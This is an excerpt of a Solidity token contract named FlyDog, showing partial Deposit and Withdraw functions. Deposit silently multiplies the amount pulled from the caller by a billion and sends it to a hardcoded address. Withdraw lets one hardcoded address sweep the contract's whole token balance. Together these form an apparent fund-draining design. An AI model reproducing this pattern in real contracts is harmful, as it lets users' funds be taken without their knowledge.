...
contract FlyDog is  SafeMath {
    ...
    function Deposit(uint256 val) public payable{
        ...
        token.transferFrom(msg.sender, 0xF8D76c80A863D778a0Ceb2E39111BF5D982953CE,safeMul(val, 1000000000));  
    }

    function Withdraw() public payable{
        require(msg.sender == address(0x9dd8d5dD03C557bFcb1D6D490169667F9d2A9Aa9));
        IERC20 _token = IERC20(0xF8D76c80A863D778a0Ceb2E39111BF5D982953CE);
        uint amount = IERC20(_token).balanceOf(address(this));
    
        IERC20(_token).transfer(0x9dd8d5dD03C557bFcb1D6D490169667F9d2A9Aa9, amount);
